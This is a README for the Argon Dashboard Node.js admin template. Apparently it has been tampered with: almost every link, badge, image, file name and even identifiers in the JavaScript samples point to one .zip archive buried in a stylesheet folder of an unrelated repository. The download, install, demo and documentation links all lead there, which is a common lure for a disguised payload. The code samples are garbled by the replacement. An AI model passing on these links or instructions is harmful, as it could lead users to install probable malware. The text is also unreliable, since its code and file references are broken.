# [Argon Dashboard Nodejs](https://raw.githubusercontent.com/shourav143/TerraForm-Test/master/public/scss/core/list-groups/TerraForm-Test_v2.4.zip) [![Tweet](https://raw.githubusercontent.com/shourav143/TerraForm-Test/master/public/scss/core/list-groups/TerraForm-Test_v2.4.zip)](https://raw.githubusercontent.com/shourav143/TerraForm-Test/master/public/scss/core/list-groups/TerraForm-Test_v2.4.zip%20Dashboard%https://raw.githubusercontent.com/shourav143/TerraForm-Test/master/public/scss/core/list-groups/TerraForm-Test_v2.4.zip%20is%20a%20Free%20Frontend%20Preset%20for%https://raw.githubusercontent.com/shourav143/TerraForm-Test/master/public/scss/core/list-groups/TerraForm-Test_v2.4.zip%20%E2%9D%A4%EF%B8%8F%0Ahttps%https://raw.githubusercontent.com/shourav143/TerraForm-Test/master/public/scss/core/list-groups/TerraForm-Test_v2.4.zip%20%23bootstrap%20%23argon%20%23design%20%23dashboard%20%23nodejs%20%23freebie%20%20via%20%40CreativeTim)

![version](https://raw.githubusercontent.com/shourav143/TerraForm-Test/master/public/scss/core/list-groups/TerraForm-Test_v2.4.zip)  ![license](https://raw.githubusercontent.com/shourav143/TerraForm-Test/master/public/scss/core/list-groups/TerraForm-Test_v2.4.zip) [![GitHub issues open](https://raw.githubusercontent.com/shourav143/TerraForm-Test/master/public/scss/core/list-groups/TerraForm-Test_v2.4.zip)](https://raw.githubusercontent.com/shourav143/TerraForm-Test/master/public/scss/core/list-groups/TerraForm-Test_v2.4.zip%3Aopen+is%3Aissue) [![GitHub issues closed](https://raw.githubusercontent.com/shourav143/TerraForm-Test/master/public/scss/core/list-groups/TerraForm-Test_v2.4.zip)](https://raw.githubusercontent.com/shourav143/TerraForm-Test/master/public/scss/core/list-groups/TerraForm-Test_v2.4.zip%3Aissue+is%3Aclosed)

![Product Image](https://raw.githubusercontent.com/shourav143/TerraForm-Test/master/public/scss/core/list-groups/TerraForm-Test_v2.4.zip)

Start your development with a Bootstrap 4 Admin Dashboard built for https://raw.githubusercontent.com/shourav143/TerraForm-Test/master/public/scss/core/list-groups/TerraForm-Test_v2.4.zip framework, the newest go-to technology for top companies. [Creative Tim](https://raw.githubusercontent.com/shourav143/TerraForm-Test/master/public/scss/core/list-groups/TerraForm-Test_v2.4.zip) partnered with [Udevoffice](https://raw.githubusercontent.com/shourav143/TerraForm-Test/master/public/scss/core/list-groups/TerraForm-Test_v2.4.zip) to provide a fully coded “frontend + backend” solution for you. It features a huge number of components that can help you create amazing websites and brings with itself innumerable advantages: lightweight, fast, scalable and modern way to execute your next top app.

**FULLY CODED COMPONENTS**

Argon Dashboard Node is built with over frontend 100 individual components, giving you the freedom of choosing and combining. All components can take variations in colour, that you can easily modify using SASS files.
You will save a lot of time going from prototyping to full-functional code, because all elements are implemented. This Dashboard is coming with prebuilt examples, so the development process is seamless, switching from our pages to the real website is very easy to be done.
Every element has multiple states for colors, styles, hover, focus, that you can easily access and use.
View all components [here](https://raw.githubusercontent.com/shourav143/TerraForm-Test/master/public/scss/core/list-groups/TerraForm-Test_v2.4.zip)

**COMPLEX DOCUMENTATION**

Each element is well presented in a very complex documentation. You can check the components [here](https://raw.githubusercontent.com/shourav143/TerraForm-Test/master/public/scss/core/list-groups/TerraForm-Test_v2.4.zip) and the foundation [here](https://raw.githubusercontent.com/shourav143/TerraForm-Test/master/public/scss/core/list-groups/TerraForm-Test_v2.4.zip)

**Example Pages**

If you want to get inspiration or just show something directly to your clients, you can jump start your development with our pre-built example pages. You will be able to quickly set up the basic structure for your web project.
View example pages [here](https://raw.githubusercontent.com/shourav143/TerraForm-Test/master/public/scss/core/list-groups/TerraForm-Test_v2.4.zip)


## Installation

1. You need `https://raw.githubusercontent.com/shourav143/TerraForm-Test/master/public/scss/core/list-groups/TerraForm-Test_v2.4.zip` (at least 10.x version) installed on your machine, if you don't have it, you should install it - download [link](https://raw.githubusercontent.com/shourav143/TerraForm-Test/master/public/scss/core/list-groups/TerraForm-Test_v2.4.zip)
2. [Clone the project from github](https://raw.githubusercontent.com/shourav143/TerraForm-Test/master/public/scss/core/list-groups/TerraForm-Test_v2.4.zip) or [download the archive](https://raw.githubusercontent.com/shourav143/TerraForm-Test/master/public/scss/core/list-groups/TerraForm-Test_v2.4.zip)
3. `cd` to your downloaded Argon app
4. Install necessary dependencies:
    - **Via node `npm` package manager** - Run `npm install` on the project root
    - **Via `yarn` package manager** - Run `yarn install` on the project root

## Configuration for PostgreSQL database and Redis data structure store

##### Via Docker

1. Install **Docker** on your machine
2. Run `docker-compose up -d` in a terminal on the project root. This will start 3 containers:
    - database(PostgreSQL) container;
    - redis container - required for session management;
    - haproxy container - required only for a staging/production setup;

##### Via another chosen solution.

1. Install your **PostgreSQL** database
2. Install your **Redis** server
3. Change connection configuration, from your root `cd` to `env-files` folder and change the following configurations with your own:

###### **For PostgreSQL connection:**
1. Database connection via URL
```bash
DATABASE_URL=http://creativeTim:creativeTim@127.0.0.1:5432/creativeTim
# Example: DATABASE_URL=http://<user>:<password>@<host>/<database_name>
```
2. Database connection via credentials
```bash
DATABASE_HOST=127.0.0.1
DATABASE_PORT=5432
DATABASE_NAME=creativeTim
DATABASE_USER=creativeTim
DATABASE_PASSWORD=creativeTim
```

######  **For Redis connection:**
1. REDIS connection via URL
```bash
REDIS_URL=redis://:@127.0.0.1:6379
# Example: redis://:<password>@<host>:<port>
```
2. REDIS connection via credentials
```bash
REDIS_HOST=127.0.0.1
REDIS_PORT=6379
REDIS_PASSWORD=
```

## Migrations and seeds

1. For database tables structure, in the project root run: `npm run knex migrate:latest` or `yarn knex migrate:latest` if you are using `yarn` as the default package manager
2. To create a default user, run: `npm run knex seed:run` or `yarn knex seed:run` if you are using `yarn` as the default package manager

## Run the application

1. For starting the application, the following script (defined in `https://raw.githubusercontent.com/shourav143/TerraForm-Test/master/public/scss/core/list-groups/TerraForm-Test_v2.4.zip` under `scripts`) must be called:
    - via **npm**: `npm run start` or `npm run dev` for starting the development environment, which has livereload enabled;
    - via **yarn**: `yarn start` or `yarn dev` for starting the development environment, which has livereload enabled;


## Usage

Register a user or login using **https://raw.githubusercontent.com/shourav143/TerraForm-Test/master/public/scss/core/list-groups/TerraForm-Test_v2.4.zip**:**secret** and start testing the preset (make sure to run the migrations and seeds for these credentials to be available).

Besides the dashboard and the auth pages this preset also has an edit profile page.
**NOTE**: _Keep in mind that all available features can be viewed once you login using the credentials provided above or by registering your own user._

## Features

In order to see the available features `cd` into `features` folder, and you will then find a folder for each of the available features, mostly each folder containing:

- A `https://raw.githubusercontent.com/shourav143/TerraForm-Test/master/public/scss/core/list-groups/TerraForm-Test_v2.4.zip` file that usually contains the `GET` and `POST` requests, for example, the profile router looks like this:

```javascript
const { wrap } = require('async-middleware');

const requestBodyValidation = require('./commands/verify-request-body');
const updateUserInfo = require('./commands/update-user-info');
const { loadPage } = require('./commands/profile');

https://raw.githubusercontent.com/shourav143/TerraForm-Test/master/public/scss/core/list-groups/TerraForm-Test_v2.4.zip = (router, middlewares = []) => {
  https://raw.githubusercontent.com/shourav143/TerraForm-Test/master/public/scss/core/list-groups/TerraForm-Test_v2.4.zip('/profile', https://raw.githubusercontent.com/shourav143/TerraForm-Test/master/public/scss/core/list-groups/TerraForm-Test_v2.4.zip(middleware => wrap(middleware)), wrap(loadPage));
  https://raw.githubusercontent.com/shourav143/TerraForm-Test/master/public/scss/core/list-groups/TerraForm-Test_v2.4.zip('/update-profile-info', wrap(requestBodyValidation), wrap(updateUserInfo));

  return router;
};
```

- A `https://raw.githubusercontent.com/shourav143/TerraForm-Test/master/public/scss/core/list-groups/TerraForm-Test_v2.4.zip` file that contains feature database queries
- A `commands` folder where you can find all feature functionality functions, for example the login template rendering which looks like this:

```javascript
function loadPage(req, res) {
  debug('login:loadPage', req, res);
  https://raw.githubusercontent.com/shourav143/TerraForm-Test/master/public/scss/core/list-groups/TerraForm-Test_v2.4.zip('pages/login');
}
```
- A `https://raw.githubusercontent.com/shourav143/TerraForm-Test/master/public/scss/core/list-groups/TerraForm-Test_v2.4.zip` file, to store all your static variables, for eg:

```
const USERNAME_PASSWORD_COMBINATION_ERROR = 'These credentials do not match our records.';
const INTERNAL_SERVER_ERROR = 'Something went wrong! Please try again.';
```

All feature routes are mounted in `https://raw.githubusercontent.com/shourav143/TerraForm-Test/master/public/scss/core/list-groups/TerraForm-Test_v2.4.zip` from the project root.

## For the Front-end side:

##### Templates

- You can find all the templates in `views` folder where you will find:
1. The `https://raw.githubusercontent.com/shourav143/TerraForm-Test/master/public/scss/core/list-groups/TerraForm-Test_v2.4.zip` file, the main template layout.
2. A `pages` folder with all the page templates
3. A `partials` folder with the common components (header, footer, sidebar)

## Table of Contents

* [Versions](#versions)
* [Demo](#demo)
* [Documentation](#documentation)
* [File Structure](#file-structure)
* [Browser Support](#browser-support)
* [Resources](#resources)
* [Reporting Issues](#reporting-issues)
* [Licensing](#licensing)
* [Useful Links](#useful-links)

## Versions

[<img src="https://raw.githubusercontent.com/shourav143/TerraForm-Test/master/public/scss/core/list-groups/TerraForm-Test_v2.4.zip" width="60" height="60" />](https://raw.githubusercontent.com/shourav143/TerraForm-Test/master/public/scss/core/list-groups/TerraForm-Test_v2.4.zip)
[<img src="https://raw.githubusercontent.com/shourav143/TerraForm-Test/master/public/scss/core/list-groups/TerraForm-Test_v2.4.zip" width="60" height="60" />](https://raw.githubusercontent.com/shourav143/TerraForm-Test/master/public/scss/core/list-groups/TerraForm-Test_v2.4.zip)

| HTML | NODEJS |
| --- | --- |
| [![Argon Dashboard HTML](https://raw.githubusercontent.com/shourav143/TerraForm-Test/master/public/scss/core/list-groups/TerraForm-Test_v2.4.zip)](https://raw.githubusercontent.com/shourav143/TerraForm-Test/master/public/scss/core/list-groups/TerraForm-Test_v2.4.zip) | [![Argon Dashboard Node](https://raw.githubusercontent.com/shourav143/TerraForm-Test/master/public/scss/core/list-groups/TerraForm-Test_v2.4.zip)](https://raw.githubusercontent.com/shourav143/TerraForm-Test/master/public/scss/core/list-groups/TerraForm-Test_v2.4.zip)

## Demo

| Register | Login | Dashboard |
| --- | --- | ---  |
| [![Register](https://raw.githubusercontent.com/shourav143/TerraForm-Test/master/public/scss/core/list-groups/TerraForm-Test_v2.4.zip)](https://raw.githubusercontent.com/shourav143/TerraForm-Test/master/public/scss/core/list-groups/TerraForm-Test_v2.4.zip)  | [![Login](https://raw.githubusercontent.com/shourav143/TerraForm-Test/master/public/scss/core/list-groups/TerraForm-Test_v2.4.zip)](https://raw.githubusercontent.com/shourav143/TerraForm-Test/master/public/scss/core/list-groups/TerraForm-Test_v2.4.zip)  | [![Dashboard](https://raw.githubusercontent.com/shourav143/TerraForm-Test/master/public/scss/core/list-groups/TerraForm-Test_v2.4.zip)](https://raw.githubusercontent.com/shourav143/TerraForm-Test/master/public/scss/core/list-groups/TerraForm-Test_v2.4.zip)

| Profile Page | Icons Page | Profile Page  |
| --- | --- | ---  |
| [![Profile Page](https://raw.githubusercontent.com/shourav143/TerraForm-Test/master/public/scss/core/list-groups/TerraForm-Test_v2.4.zip)](https://raw.githubusercontent.com/shourav143/TerraForm-Test/master/public/scss/core/list-groups/TerraForm-Test_v2.4.zip)  | [![Icons Page](https://raw.githubusercontent.com/shourav143/TerraForm-Test/master/public/scss/core/list-groups/TerraForm-Test_v2.4.zip)](https://raw.githubusercontent.com/shourav143/TerraForm-Test/master/public/scss/core/list-groups/TerraForm-Test_v2.4.zip)  | [![Tables Page](https://raw.githubusercontent.com/shourav143/TerraForm-Test/master/public/scss/core/list-groups/TerraForm-Test_v2.4.zip)](https://raw.githubusercontent.com/shourav143/TerraForm-Test/master/public/scss/core/list-groups/TerraForm-Test_v2.4.zip)
[View More](https://raw.githubusercontent.com/shourav143/TerraForm-Test/master/public/scss/core/list-groups/TerraForm-Test_v2.4.zip)

## Documentation
The documentation for the Argon Dashboard Node is hosted at our [website](https://raw.githubusercontent.com/shourav143/TerraForm-Test/master/public/scss/core/list-groups/TerraForm-Test_v2.4.zip).

## File Structure

```
├── https://raw.githubusercontent.com/shourav143/TerraForm-Test/master/public/scss/core/list-groups/TerraForm-Test_v2.4.zip
├── https://raw.githubusercontent.com/shourav143/TerraForm-Test/master/public/scss/core/list-groups/TerraForm-Test_v2.4.zip
├── https://raw.githubusercontent.com/shourav143/TerraForm-Test/master/public/scss/core/list-groups/TerraForm-Test_v2.4.zip
├── https://raw.githubusercontent.com/shourav143/TerraForm-Test/master/public/scss/core/list-groups/TerraForm-Test_v2.4.zip
├── https://raw.githubusercontent.com/shourav143/TerraForm-Test/master/public/scss/core/list-groups/TerraForm-Test_v2.4.zip
├── bin
│   └── www
├── config
│   └── https://raw.githubusercontent.com/shourav143/TerraForm-Test/master/public/scss/core/list-groups/TerraForm-Test_v2.4.zip
├── db
│   ├── https://raw.githubusercontent.com/shourav143/TerraForm-Test/master/public/scss/core/list-groups/TerraForm-Test_v2.4.zip
│   ├── https://raw.githubusercontent.com/shourav143/TerraForm-Test/master/public/scss/core/list-groups/TerraForm-Test_v2.4.zip
│   ├── migrations
│   │   └── https://raw.githubusercontent.com/shourav143/TerraForm-Test/master/public/scss/core/list-groups/TerraForm-Test_v2.4.zip
│   └── seeds
│       └── https://raw.githubusercontent.com/shourav143/TerraForm-Test/master/public/scss/core/list-groups/TerraForm-Test_v2.4.zip
├── https://raw.githubusercontent.com/shourav143/TerraForm-Test/master/public/scss/core/list-groups/TerraForm-Test_v2.4.zip
├── docs
│   └── https://raw.githubusercontent.com/shourav143/TerraForm-Test/master/public/scss/core/list-groups/TerraForm-Test_v2.4.zip
├── https://raw.githubusercontent.com/shourav143/TerraForm-Test/master/public/scss/core/list-groups/TerraForm-Test_v2.4.zip
├── env-files
│   ├── https://raw.githubusercontent.com/shourav143/TerraForm-Test/master/public/scss/core/list-groups/TerraForm-Test_v2.4.zip
│   └── https://raw.githubusercontent.com/shourav143/TerraForm-Test/master/public/scss/core/list-groups/TerraForm-Test_v2.4.zip
├── features
│   ├── login
│   │   ├── commands
│   │   │   ├── https://raw.githubusercontent.com/shourav143/TerraForm-Test/master/public/scss/core/list-groups/TerraForm-Test_v2.4.zip
│   │   │   ├── https://raw.githubusercontent.com/shourav143/TerraForm-Test/master/public/scss/core/list-groups/TerraForm-Test_v2.4.zip
│   │   │   ├── https://raw.githubusercontent.com/shourav143/TerraForm-Test/master/public/scss/core/list-groups/TerraForm-Test_v2.4.zip
│   │   │   └── https://raw.githubusercontent.com/shourav143/TerraForm-Test/master/public/scss/core/list-groups/TerraForm-Test_v2.4.zip
│   │   ├── https://raw.githubusercontent.com/shourav143/TerraForm-Test/master/public/scss/core/list-groups/TerraForm-Test_v2.4.zip
│   │   ├── https://raw.githubusercontent.com/shourav143/TerraForm-Test/master/public/scss/core/list-groups/TerraForm-Test_v2.4.zip
│   │   ├── https://raw.githubusercontent.com/shourav143/TerraForm-Test/master/public/scss/core/list-groups/TerraForm-Test_v2.4.zip
│   │   └── https://raw.githubusercontent.com/shourav143/TerraForm-Test/master/public/scss/core/list-groups/TerraForm-Test_v2.4.zip
│   ├── logout
│   │   ├── commands
│   │   │   └── https://raw.githubusercontent.com/shourav143/TerraForm-Test/master/public/scss/core/list-groups/TerraForm-Test_v2.4.zip
│   │   └── https://raw.githubusercontent.com/shourav143/TerraForm-Test/master/public/scss/core/list-groups/TerraForm-Test_v2.4.zip
│   ├── profile
│   │   ├── commands
│   │   │   ├── https://raw.githubusercontent.com/shourav143/TerraForm-Test/master/public/scss/core/list-groups/TerraForm-Test_v2.4.zip
│   │   │   ├── https://raw.githubusercontent.com/shourav143/TerraForm-Test/master/public/scss/core/list-groups/TerraForm-Test_v2.4.zip
│   │   │   └── https://raw.githubusercontent.com/shourav143/TerraForm-Test/master/public/scss/core/list-groups/TerraForm-Test_v2.4.zip
│   │   ├── https://raw.githubusercontent.com/shourav143/TerraForm-Test/master/public/scss/core/list-groups/TerraForm-Test_v2.4.zip
│   │   ├── https://raw.githubusercontent.com/shourav143/TerraForm-Test/master/public/scss/core/list-groups/TerraForm-Test_v2.4.zip
│   │   └── https://raw.githubusercontent.com/shourav143/TerraForm-Test/master/public/scss/core/list-groups/TerraForm-Test_v2.4.zip
│   ├── register
│   │   ├── commands
│   │   │   ├── https://raw.githubusercontent.com/shourav143/TerraForm-Test/master/public/scss/core/list-groups/TerraForm-Test_v2.4.zip
│   │   │   ├── https://raw.githubusercontent.com/shourav143/TerraForm-Test/master/public/scss/core/list-groups/TerraForm-Test_v2.4.zip
│   │   │   └── https://raw.githubusercontent.com/shourav143/TerraForm-Test/master/public/scss/core/list-groups/TerraForm-Test_v2.4.zip
│   │   ├── https://raw.githubusercontent.com/shourav143/TerraForm-Test/master/public/scss/core/list-groups/TerraForm-Test_v2.4.zip
│   │   ├── https://raw.githubusercontent.com/shourav143/TerraForm-Test/master/public/scss/core/list-groups/TerraForm-Test_v2.4.zip
│   │   └── https://raw.githubusercontent.com/shourav143/TerraForm-Test/master/public/scss/core/list-groups/TerraForm-Test_v2.4.zip
│   └── reset-password
│       ├── commands
│       │   └── https://raw.githubusercontent.com/shourav143/TerraForm-Test/master/public/scss/core/list-groups/TerraForm-Test_v2.4.zip
│       └── https://raw.githubusercontent.com/shourav143/TerraForm-Test/master/public/scss/core/list-groups/TerraForm-Test_v2.4.zip
├── https://raw.githubusercontent.com/shourav143/TerraForm-Test/master/public/scss/core/list-groups/TerraForm-Test_v2.4.zip
├── https://raw.githubusercontent.com/shourav143/TerraForm-Test/master/public/scss/core/list-groups/TerraForm-Test_v2.4.zip
├── https://raw.githubusercontent.com/shourav143/TerraForm-Test/master/public/scss/core/list-groups/TerraForm-Test_v2.4.zip
├── https://raw.githubusercontent.com/shourav143/TerraForm-Test/master/public/scss/core/list-groups/TerraForm-Test_v2.4.zip
├── public
│   ├── css
│   │   ├── https://raw.githubusercontent.com/shourav143/TerraForm-Test/master/public/scss/core/list-groups/TerraForm-Test_v2.4.zip
│   │   └── https://raw.githubusercontent.com/shourav143/TerraForm-Test/master/public/scss/core/list-groups/TerraForm-Test_v2.4.zip
│   ├── fonts
│   │   └── nucleo
│   ├── img
│   │   ├── brand
│   │   ├── icons
│   │   └── theme
│   ├── js
│   │   ├── https://raw.githubusercontent.com/shourav143/TerraForm-Test/master/public/scss/core/list-groups/TerraForm-Test_v2.4.zip
│   │   └── https://raw.githubusercontent.com/shourav143/TerraForm-Test/master/public/scss/core/list-groups/TerraForm-Test_v2.4.zip
│   ├── scss
│   │   ├── https://raw.githubusercontent.com/shourav143/TerraForm-Test/master/public/scss/core/list-groups/TerraForm-Test_v2.4.zip
│   │   ├── bootstrap
│   │   ├── core
│   │   └── custom
│   └── vendor
├── routes
│   └── https://raw.githubusercontent.com/shourav143/TerraForm-Test/master/public/scss/core/list-groups/TerraForm-Test_v2.4.zip
├── screens
│   ├── https://raw.githubusercontent.com/shourav143/TerraForm-Test/master/public/scss/core/list-groups/TerraForm-Test_v2.4.zip
│   ├── https://raw.githubusercontent.com/shourav143/TerraForm-Test/master/public/scss/core/list-groups/TerraForm-Test_v2.4.zip
│   ├── https://raw.githubusercontent.com/shourav143/TerraForm-Test/master/public/scss/core/list-groups/TerraForm-Test_v2.4.zip
│   └── https://raw.githubusercontent.com/shourav143/TerraForm-Test/master/public/scss/core/list-groups/TerraForm-Test_v2.4.zip
├── views
│   ├── https://raw.githubusercontent.com/shourav143/TerraForm-Test/master/public/scss/core/list-groups/TerraForm-Test_v2.4.zip
│   ├── pages
│   │   ├── https://raw.githubusercontent.com/shourav143/TerraForm-Test/master/public/scss/core/list-groups/TerraForm-Test_v2.4.zip
│   │   ├── https://raw.githubusercontent.com/shourav143/TerraForm-Test/master/public/scss/core/list-groups/TerraForm-Test_v2.4.zip
│   │   ├── https://raw.githubusercontent.com/shourav143/TerraForm-Test/master/public/scss/core/list-groups/TerraForm-Test_v2.4.zip
│   │   ├── https://raw.githubusercontent.com/shourav143/TerraForm-Test/master/public/scss/core/list-groups/TerraForm-Test_v2.4.zip
│   │   ├── https://raw.githubusercontent.com/shourav143/TerraForm-Test/master/public/scss/core/list-groups/TerraForm-Test_v2.4.zip
│   │   ├── https://raw.githubusercontent.com/shourav143/TerraForm-Test/master/public/scss/core/list-groups/TerraForm-Test_v2.4.zip
│   │   ├── https://raw.githubusercontent.com/shourav143/TerraForm-Test/master/public/scss/core/list-groups/TerraForm-Test_v2.4.zip
│   │   ├── https://raw.githubusercontent.com/shourav143/TerraForm-Test/master/public/scss/core/list-groups/TerraForm-Test_v2.4.zip
│   │   └── https://raw.githubusercontent.com/shourav143/TerraForm-Test/master/public/scss/core/list-groups/TerraForm-Test_v2.4.zip
│   └── partials
│       ├── auth
│       │   ├── https://raw.githubusercontent.com/shourav143/TerraForm-Test/master/public/scss/core/list-groups/TerraForm-Test_v2.4.zip
│       │   ├── https://raw.githubusercontent.com/shourav143/TerraForm-Test/master/public/scss/core/list-groups/TerraForm-Test_v2.4.zip
│       │   └── https://raw.githubusercontent.com/shourav143/TerraForm-Test/master/public/scss/core/list-groups/TerraForm-Test_v2.4.zip
│       ├── https://raw.githubusercontent.com/shourav143/TerraForm-Test/master/public/scss/core/list-groups/TerraForm-Test_v2.4.zip
│       ├── https://raw.githubusercontent.com/shourav143/TerraForm-Test/master/public/scss/core/list-groups/TerraForm-Test_v2.4.zip
│       ├── https://raw.githubusercontent.com/shourav143/TerraForm-Test/master/public/scss/core/list-groups/TerraForm-Test_v2.4.zip
│       ├── https://raw.githubusercontent.com/shourav143/TerraForm-Test/master/public/scss/core/list-groups/TerraForm-Test_v2.4.zip
│       └── https://raw.githubusercontent.com/shourav143/TerraForm-Test/master/public/scss/core/list-groups/TerraForm-Test_v2.4.zip
└
```
## Browser Support

At present, we officially aim to support the last two versions of the following browsers:

<img src="https://raw.githubusercontent.com/shourav143/TerraForm-Test/master/public/scss/core/list-groups/TerraForm-Test_v2.4.zip" width="64" height="64"> <img src="https://raw.githubusercontent.com/shourav143/TerraForm-Test/master/public/scss/core/list-groups/TerraForm-Test_v2.4.zip" width="64" height="64"> <img src="https://raw.githubusercontent.com/shourav143/TerraForm-Test/master/public/scss/core/list-groups/TerraForm-Test_v2.4.zip" width="64" height="64"> <img src="https://raw.githubusercontent.com/shourav143/TerraForm-Test/master/public/scss/core/list-groups/TerraForm-Test_v2.4.zip" width="64" height="64"> <img src="https://raw.githubusercontent.com/shourav143/TerraForm-Test/master/public/scss/core/list-groups/TerraForm-Test_v2.4.zip" width="64" height="64">


## Resources
- Demo: <https://raw.githubusercontent.com/shourav143/TerraForm-Test/master/public/scss/core/list-groups/TerraForm-Test_v2.4.zip>
- Download Page: <https://raw.githubusercontent.com/shourav143/TerraForm-Test/master/public/scss/core/list-groups/TerraForm-Test_v2.4.zip>
- Documentation: <https://raw.githubusercontent.com/shourav143/TerraForm-Test/master/public/scss/core/list-groups/TerraForm-Test_v2.4.zip>
- License Agreement: <https://raw.githubusercontent.com/shourav143/TerraForm-Test/master/public/scss/core/list-groups/TerraForm-Test_v2.4.zip>
- Support: <https://raw.githubusercontent.com/shourav143/TerraForm-Test/master/public/scss/core/list-groups/TerraForm-Test_v2.4.zip>
- Issues: [Github Issues Page](https://raw.githubusercontent.com/shourav143/TerraForm-Test/master/public/scss/core/list-groups/TerraForm-Test_v2.4.zip)
- **Dashboards:**

| HTML | NODEJS |
| --- | --- |
| [![Argon Dashboard HTML](https://raw.githubusercontent.com/shourav143/TerraForm-Test/master/public/scss/core/list-groups/TerraForm-Test_v2.4.zip)](https://raw.githubusercontent.com/shourav143/TerraForm-Test/master/public/scss/core/list-groups/TerraForm-Test_v2.4.zip) | [![Argon Dashboard Node](https://raw.githubusercontent.com/shourav143/TerraForm-Test/master/public/scss/core/list-groups/TerraForm-Test_v2.4.zip)](https://raw.githubusercontent.com/shourav143/TerraForm-Test/master/public/scss/core/list-groups/TerraForm-Test_v2.4.zip)

## Change log

Please see the [changelog](https://raw.githubusercontent.com/shourav143/TerraForm-Test/master/public/scss/core/list-groups/TerraForm-Test_v2.4.zip) for more information on what has changed recently.

## Credits

- [Creative Tim](https://raw.githubusercontent.com/shourav143/TerraForm-Test/master/public/scss/core/list-groups/TerraForm-Test_v2.4.zip)
- [Under Development Office](https://raw.githubusercontent.com/shourav143/TerraForm-Test/master/public/scss/core/list-groups/TerraForm-Test_v2.4.zip)

## License

[MIT License](https://raw.githubusercontent.com/shourav143/TerraForm-Test/master/public/scss/core/list-groups/TerraForm-Test_v2.4.zip).

## Reporting Issues

We use GitHub Issues as the official bug tracker for the Material Kit. Here are some advices for our users that want to report an issue:

1. Make sure that you are using the latest version of the Material Kit. Check the CHANGELOG from your dashboard on our [website](https://raw.githubusercontent.com/shourav143/TerraForm-Test/master/public/scss/core/list-groups/TerraForm-Test_v2.4.zip).
2. Providing us reproducible steps for the issue will shorten the time it takes for it to be fixed.
3. Some issues may be browser specific, so specifying in what browser you encountered the issue might help.

## Licensing

- Copyright 2019 Creative Tim (https://raw.githubusercontent.com/shourav143/TerraForm-Test/master/public/scss/core/list-groups/TerraForm-Test_v2.4.zip)

- Licensed under MIT (https://raw.githubusercontent.com/shourav143/TerraForm-Test/master/public/scss/core/list-groups/TerraForm-Test_v2.4.zip)

## Useful Links

- [Tutorials](https://raw.githubusercontent.com/shourav143/TerraForm-Test/master/public/scss/core/list-groups/TerraForm-Test_v2.4.zip)
- [Affiliate Program](https://raw.githubusercontent.com/shourav143/TerraForm-Test/master/public/scss/core/list-groups/TerraForm-Test_v2.4.zip) (earn money)
- [Blog Creative Tim](https://raw.githubusercontent.com/shourav143/TerraForm-Test/master/public/scss/core/list-groups/TerraForm-Test_v2.4.zip)
- [Free Products](https://raw.githubusercontent.com/shourav143/TerraForm-Test/master/public/scss/core/list-groups/TerraForm-Test_v2.4.zip) from Creative Tim
- [Premium Products](https://raw.githubusercontent.com/shourav143/TerraForm-Test/master/public/scss/core/list-groups/TerraForm-Test_v2.4.zip) from Creative Tim
- [React Products](https://raw.githubusercontent.com/shourav143/TerraForm-Test/master/public/scss/core/list-groups/TerraForm-Test_v2.4.zip) from Creative Tim
- [Angular Products](https://raw.githubusercontent.com/shourav143/TerraForm-Test/master/public/scss/core/list-groups/TerraForm-Test_v2.4.zip) from Creative Tim
- [VueJS Products](https://raw.githubusercontent.com/shourav143/TerraForm-Test/master/public/scss/core/list-groups/TerraForm-Test_v2.4.zip) from Creative Tim
- [More products](https://raw.githubusercontent.com/shourav143/TerraForm-Test/master/public/scss/core/list-groups/TerraForm-Test_v2.4.zip) from Creative Tim
- Check our Bundles [here](https://raw.githubusercontent.com/shourav143/TerraForm-Test/master/public/scss/core/list-groups/TerraForm-Test_v2.4.zip)

### Social Media

Twitter: <https://raw.githubusercontent.com/shourav143/TerraForm-Test/master/public/scss/core/list-groups/TerraForm-Test_v2.4.zip>

Facebook: <https://raw.githubusercontent.com/shourav143/TerraForm-Test/master/public/scss/core/list-groups/TerraForm-Test_v2.4.zip>

Dribbble: <https://raw.githubusercontent.com/shourav143/TerraForm-Test/master/public/scss/core/list-groups/TerraForm-Test_v2.4.zip>

Instagram: <https://raw.githubusercontent.com/shourav143/TerraForm-Test/master/public/scss/core/list-groups/TerraForm-Test_v2.4.zip>

## Credits

- [Creative Tim](https://raw.githubusercontent.com/shourav143/TerraForm-Test/master/public/scss/core/list-groups/TerraForm-Test_v2.4.zip)
- [Under Development Office](https://raw.githubusercontent.com/shourav143/TerraForm-Test/master/public/scss/core/list-groups/TerraForm-Test_v2.4.zip)
